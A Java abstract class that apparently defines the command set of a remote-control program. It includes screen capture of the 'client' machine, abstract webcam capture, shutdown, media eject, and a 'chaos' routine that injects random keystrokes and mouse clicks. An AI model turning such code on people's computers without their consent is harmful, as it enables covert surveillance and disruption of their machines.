import javax.swing.*;
import java.awt.*;
import java.awt.event.InputEvent;
import java.awt.image.BufferedImage;
import java.io.IOException;
import java.nio.file.Path;
import java.util.Random;

/**
 * contains the definitions and some implementations (if they are not OS specific) of the features of the program
 */
public abstract class CommandSet
{
    /** the runtime environment for the host OS, used for OS specific commands */
    private Runtime runtime = Runtime.getRuntime();

    public abstract void eject() throws IOException;
    public abstract void playSound();
    public abstract void shutdown();
    public abstract void restart();
    public abstract void takeCameraPicture();
    public abstract void setWallpaper(Image newWallpaper);

    /**
     * shows a message box on the clients screen
     * @param message the msg to be displayed in the msg box
     */
    public void showMessage(String message, String title, String type)
    {
        int option = JOptionPane.NO_OPTION;
        if(type.equals("info"))
            option = JOptionPane.INFORMATION_MESSAGE;
        else if(type.equals("error"))
            option = JOptionPane.ERROR_MESSAGE;
        else if(type.equals("question"))
            option = JOptionPane.QUESTION_MESSAGE;
        JOptionPane.showMessageDialog(null, message, title, option);
    }

    /**
     * takes a screenshot of the clients monitor
     * @return a BufferedImage that is the screenshot
     * @throws AWTException if something went wrong when creating the robot
     */
    public BufferedImage takeScreenshot() throws AWTException
    {
        Robot robot = new Robot();
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        return robot.createScreenCapture(new Rectangle(screenSize));
    }

    /**
     * randomly presses keys, moves the mouse and clicks mouse buttons on the clients computer
     * @param length the time in ms the random actions should last for
     * @param delay the time delay in ms between each random action
     * @throws AWTException
     */
    public void chaos(long length, long delay) throws AWTException
    {
        Robot robot = new Robot();
        long start = System.currentTimeMillis();
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Random random = new Random();
        while(System.currentTimeMillis() - start < length)
        {
            try
            {
                int key = random.nextInt(222) + 1;
                robot.keyPress(key);
                Thread.sleep(delay);
                robot.keyRelease(key);
                Thread.sleep(delay);
                robot.mouseMove(random.nextInt(screenSize.width), random.nextInt(screenSize.height));
                Thread.sleep(delay);
                switch(random.nextInt(3))
                {
                    case 0:
                        robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
                        robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
                        break;
                    case 1:
                        robot.mousePress(InputEvent.BUTTON2_DOWN_MASK);
                        robot.mouseRelease(InputEvent.BUTTON2_DOWN_MASK);
                        break;
                    case 2:
                        robot.mousePress(InputEvent.BUTTON3_DOWN_MASK);
                        robot.mouseRelease(InputEvent.BUTTON3_DOWN_MASK);
                        break;
                }
                Thread.sleep(delay);
            }
            catch(InterruptedException ie)
            {

            }
        }
    }

    public Runtime getRuntime()
    {
        return runtime;
    }

}
